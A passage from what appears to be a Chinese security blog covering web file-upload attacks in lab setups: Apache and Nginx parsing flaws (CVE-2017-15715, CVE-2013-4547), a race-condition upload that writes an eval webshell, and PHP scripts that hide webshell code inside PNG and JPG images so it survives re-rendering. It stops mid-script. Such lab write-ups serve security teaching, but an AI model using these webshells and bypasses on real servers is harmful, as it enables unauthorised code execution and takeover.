//拉取镜像</span><br><span class="line"><span class="built_in">cd</span> vulhub/httpd/CVE-2017-15715</span><br><span class="line">docker-compose up -d //启动容器</span><br></pre></td></tr></table></figure><p>找到8080端口，访问即可，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240803160426625.png" alt="image-20240803160426625"></p><p>我们首先随便上传一个php文件，然后抓包看看是什么情况</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240803160807482.png" alt="image-20240803160807482"></p><p>当我们提交一个php文件的时候，会给我们返回一个badfile，即我们上传不上去，这里我们利用换行解析进行绕过，如下所示，我们首先切换到HEX模式，在<code>evil.php</code>后面添加一个换行符，即<code>0a</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240803161205867.png" alt="image-20240803161205867"></p><p>点击发送，发现不返回<code>badfile</code>，证明我们成功绕过</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240803161311341.png" alt="image-20240803161311341"></p><p>我们去访问这个文件，输入<code>evil.php%0a</code>，成功上传</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240803161557160.png" alt="image-20240803161557160"></p><h2 id="多后缀解析漏洞"><a href="#多后缀解析漏洞" class="headerlink" title="多后缀解析漏洞"></a>多后缀解析漏洞</h2><p>Apache解析文件的规则是从右往左开始判断解析，如果后缀名为不可识别文件解析，就再从左往右进行判断。比如<code>test.php.a.b</code>的<code>.a</code>和<code>.b</code>这两种后缀是apache不可识别的，所以apache会将其解析成<code>test.php</code></p><p>影响版本：apache 1.x        apache 2.2.x</p><p>下面以一个实例进行演示</p><h3 id="apache-parsing-vulnerability复现"><a href="#apache-parsing-vulnerability复现" class="headerlink" title="apache_parsing_vulnerability复现"></a>apache_parsing_vulnerability复现</h3><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240803163207241.png" alt="image-20240803163207241"></p><p>我们首先看到apache版本号，初步判断有文件上传漏洞</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240803163435831.png" alt="image-20240803163435831"></p><p>我们将文件命名加上<code>.jpg</code>，发现成功上传，访问该文件，发现apache将其当作php文件进行执行</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240803163536767.png" alt="image-20240803163536767"></p><p>当然，如果要保证这个效果，还需要我们上传之后不会对其进行重命名，否则该漏洞也失效，即不会对<code>attack.php</code>进行重命名</p><h1 id="Nginx文件上传漏洞"><a href="#Nginx文件上传漏洞" class="headerlink" title="Nginx文件上传漏洞"></a>Nginx文件上传漏洞</h1><h2 id="Nginx文件名逻辑漏洞"><a href="#Nginx文件名逻辑漏洞" class="headerlink" title="Nginx文件名逻辑漏洞"></a>Nginx文件名逻辑漏洞</h2><p>CVE-2013-4547漏洞是由于非法字符空格和截止符号导致Nginx在解析URL时的有限状态机混乱，导致攻击者可以通过一个非编码空格绕过后缀名限制</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://xxxxxxxxx/123.png \0.php</span><br></pre></td></tr></table></figure><p>从代码层面来说，我们请求的url中<code>123.png[0x20][0x00].php</code>正好与location模块中的.php相匹配，但进入该模块后Nginx确认为请求的文件名是<code>123.png</code>，就设置其为script_name的值交给CGI进行解析，最终造成解析漏洞</p><p>影响版本：Nginx 0.8.41-1.4.3/1.5.0-1.5.7</p><h3 id="CVE-2013-4547漏洞复现"><a href="#CVE-2013-4547漏洞复现" class="headerlink" title="CVE-2013-4547漏洞复现"></a>CVE-2013-4547漏洞复现</h3><p>随便上传一个文件，查看ngnix版本号</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240803170125049.png" alt="image-20240803170125049"></p><p>符合我们的影响版本范围，我们直接进行操作，将<code>20</code>改成<code>00</code>即可</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240803170649346.png" alt="image-20240803170649346"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240803170834185.png" alt="image-20240803170834185"></p><p>成功上传，我们访问一下试试</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240803171218858.png" alt="image-20240803171218858"></p><h2 id="Nginx解析漏洞"><a href="#Nginx解析漏洞" class="headerlink" title="Nginx解析漏洞"></a>Nginx解析漏洞</h2><p>对于任意文件名，在后面添加<code>/abc.php</code>（abc为任意字符）后，即可将文件作为php解析</p><p>Nginx的解析漏洞的出现和Nginx的版本没有关系，漏洞的产生是由于php配置问题导致的。</p><p> 影响的范围：全版本 Nginx拿到文件路径（URI）<code>/test.jpg/abc.php</code>后，一看后缀是.php，便认为该文件是php文件，转交给 php去处理。php一看<code>/test.jpg/abc.php</code>不存在，便删去最后的<code>/abc.php</code>，又看<code>/test.jpg</code>存在，便 把<code>/test.jpg</code>当成要执行的文件了</p><h3 id="nginx-parsing-vulnerability复现"><a href="#nginx-parsing-vulnerability复现" class="headerlink" title="nginx_parsing_vulnerability复现"></a>nginx_parsing_vulnerability复现</h3><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240803171841899.png" alt="image-20240803171841899"></p><p>首先限制了我们上传图片，我们试着能不能通过MIME进行绕过</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240803171922225.png" alt="image-20240803171922225"></p><p>MIME可以绕过第一层，但是还是会检测后缀，这个时候就要利用解析漏洞了</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240803172039700.png" alt="image-20240803172039700"></p><p>我们首先上传一个png，然后在访问的时候在后面随机加上php后缀文件，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240803172158431.png" alt="image-20240803172158431"></p><p>成功利用</p><h1 id="Ueditor文件上传安全"><a href="#Ueditor文件上传安全" class="headerlink" title="Ueditor文件上传安全"></a>Ueditor文件上传安全</h1><p>主要是编辑器是否存在漏洞，跟源码和中间件无关，我们首先要看哪里有上传点，看到哪里有上传点后，看编辑器的类型是哪一种，然后找历史漏洞，现在一般也很少见了</p><p>具体利用过程参考这一篇文章：</p><p><a href="https://www.cnblogs.com/hei-zi/p/13394764.html">Ueditor上传漏洞复现+环境搭建 - 黑岗0x0001 - 博客园 (cnblogs.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> WEB攻防 </category>
          
          <category> 文件上漏洞 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
            <tag> 中间件解析漏洞 </tag>
            
            <tag> 编辑器安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEB攻防-通用漏洞-文件上传之二次渲染、变异免杀、日志包含</title>
      <link href="/post/f11a355.html"/>
      <url>/post/f11a355.html</url>
      
        <content type="html"><![CDATA[<h2 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h2><p>文件上传的条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的，因此如果处理不当或相关逻辑顺序设计不合理的时候，就会导致此类问题的发生，如果我们采用大量的并发请求，就传递一个生成恶意webshell的图像，访问它就可以生成webshell，在上传完成喝安全检查完成并删除它的间隙，攻击者通过不断地发起访问请求来访问该文件，该文件就会被执行，并在服务器上生成一个恶意地webshell</p><p>我们接下来以一道<code>upload-labs</code>的pass-18来展示条件竞争的手法</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240726101452797.png" alt="image-20240726101452797"></p><p>我们首先上传一个PHP文件，看看我们的目录中有没有出现PHP，我们发现根本上传不上去，查看对应的源码</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240726102251196.png" alt="image-20240726102251196"></p><p>我们可以知道我们在上传的一瞬间，只要检测到了是PHP文件，我们的后端就会删除这个文件并且返回文件类型错误，我们这个时候就可以使用条件竞争来进行绕过</p><p>我们首先将上传进去的木马换成如下</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$f</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;shell.php&quot;</span>,<span class="string">&quot;w&quot;</span>); <span class="title function_ invoke__">fputs</span>(<span class="variable">$f</span>,<span class="string">&#x27;&lt;?php @eval($_POST[cmd]);?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>即让每次上传都试着创建一个新的后门木马，进而形成条件竞争，我们设置无限重放，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/da6f550ba477d0c0bab2bec33ffc45eb.png" alt="da6f550ba477d0c0bab2bec33ffc45eb"></p><p>然后我们将线程调大一点，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240726103218857.png" alt="image-20240726103218857"></p><p>同时，我们创建一个python脚本，让其一直去访问shell.php，如下所示</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line">url = <span class="string">&quot;http://upload.local/upload/shell.php&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"> </span><br><span class="line">    html = requests.get(url)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> html.status_code == <span class="number">200</span>:</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>值得注意的是，我们需要先运行python脚本再运行burp，否则会出现一些逻辑问题</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240726110628447.png" alt="image-20240726110628447"></p><p>经过一段时间后，我们可以发现相关php文件已经被写入进去</p><h2 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>在我们上传文件后，网站会对图片进行二次处理（格式、尺寸）等，服务器会把里面的内容进行替换更新，处理完成之后，根据我们原有的图片生成一个新的图片并放到网站下的标签进行显示，这样处理后，如果我们的一句话木马插入非常随意的话，就容易被服务器进行修改，进而改变我们的后门代码，导致无法利用后门</p><h3 id="PNG二次渲染"><a href="#PNG二次渲染" class="headerlink" title="PNG二次渲染"></a>PNG二次渲染</h3><p>接下来就用大佬的代码来进行演示，对于png图片，我们可以进行如下操作</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;2.png&#x27;</span>);  <span class="comment">//要修改的图片的路径</span></span><br><span class="line"><span class="comment">/* 木马内容</span></span><br><span class="line"><span class="comment">&lt;?$_GET[0]($_POST[1]);?&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们直接运行这个脚本，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240726110946022.png" alt="image-20240726110946022"></p><p>成功在当前目录下生成2.png，我们尝试用二进制编辑器打开，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240726111112483.png" alt="image-20240726111112483"></p><p>确实存在后门代码，之后我们直接进行上传即可</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240726111346807.png" alt="image-20240726111346807"></p><p>上传成功，我们直接进行命令执行，得到结果如下</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240726123115955.png" alt="image-20240726123115955"></p><p>说明我们成功拿到后门</p><h3 id="JPG二次渲染"><a href="#JPG二次渲染" class="headerlink" title="JPG二次渲染"></a>JPG二次渲染</h3><p>代码如下</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span></span><br><span class="line"><span class="comment">    It is necessary that the size and quality of the initial image are the same as those of the processed image.</span></span><br><span class="line"><span class="comment">    1) Upload an arbitrary image via secured files upload script</span></span><br><span class="line"><span class="comment">    2) Save the processed image and launch:</span></span><br><span class="line"><span class="comment">    jpg_payload.php &lt;jpg_name.jpg&gt;</span></span><br><span class="line"><span class="comment">    In case of successful injection you will get a specially crafted image, which should be uploaded again.</span></span><br><span class="line"><span class="comment">    Since the most straightforward injection method is used, the following problems can occur:</span></span><br><span class="line"><span class="comment">    1) After the second processing the injected data may become partially corrupted.</span></span><br><span class="line"><span class="comment">    2) The jpg_payload.php script outputs &quot;Something&#x27;s wrong&quot;.</span></span><br><span class="line"><span class="comment">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span></span><br><span class="line"><span class="comment">    Sergey Bobrov <span class="doctag">@Black</span>2Fan.</span></span><br><span class="line"><span class="comment">    See also:</span></span><br><span class="line"><span class="comment">    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"> </span><br><span class="line">    <span class="variable">$miniPayload</span> = <span class="string">&quot;&lt;?=phpinfo();?&gt;&quot;</span>;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;gd&#x27;</span>) || !<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="title function_ invoke__">set_error_handler</span>(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$pad</span> = <span class="number">0</span>; <span class="variable">$pad</span> &lt; <span class="number">1024</span>; <span class="variable">$pad</span>++) &#123;</span><br><span class="line">        <span class="variable">$nullbytePayloadSize</span> = <span class="variable">$pad</span>;</span><br><span class="line">        <span class="variable">$dis</span> = <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$outStream</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$extraBytes</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>()) &amp;&amp; (<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">            <span class="variable">$marker</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>();</span><br><span class="line">            <span class="variable">$size</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() - <span class="number">2</span>;</span><br><span class="line">            <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">skip</span>(<span class="variable">$size</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$marker</span> === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                <span class="variable">$startPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>();</span><br><span class="line">                <span class="variable">$outStreamTmp</span> = </span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                    <span class="variable">$miniPayload</span> . </span><br><span class="line">                    <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>) . </span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>);</span><br><span class="line">                <span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStreamTmp</span>, <span class="literal">TRUE</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$extraBytes</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>())) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$stopPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>() - <span class="number">2</span>;</span><br><span class="line">                    <span class="variable">$imageStreamSize</span> = <span class="variable">$stopPos</span> - <span class="variable">$startPos</span>;</span><br><span class="line">                    <span class="variable">$outStream</span> = </span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                        <span class="variable">$miniPayload</span> . </span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(</span><br><span class="line">                            <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>).</span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>, <span class="variable">$imageStreamSize</span>),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            <span class="variable">$nullbytePayloadSize</span>+<span class="variable">$imageStreamSize</span>-<span class="variable">$extraBytes</span>) . </span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$stopPos</span>);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>(<span class="variable">$correctImage</span>) &#123;</span><br><span class="line">                    <span class="variable">$outStream</span> = <span class="variable">$outStreamTmp</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStream</span>)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$data</span>, <span class="variable">$unlink</span> = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line">        <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$unlink</span>)</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$correctImage</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$extraBytes</span>, <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="variable">$errstr</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$m</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="variable">$extraBytes</span> = (<span class="keyword">int</span>)<span class="variable">$m</span>[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$binData</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$size</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$order</span> = <span class="literal">false</span>, <span class="variable">$fromString</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;order = <span class="variable">$order</span>;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable">$fromString</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) || !<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="variable">$filename</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;size = <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;size - <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params"><span class="variable">$skip</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="variable">$skip</span>);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">eof</span>()) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$byte</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">ord</span>(<span class="variable">$byte</span>);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$short</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;order) &#123;</span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]) &lt;&lt; 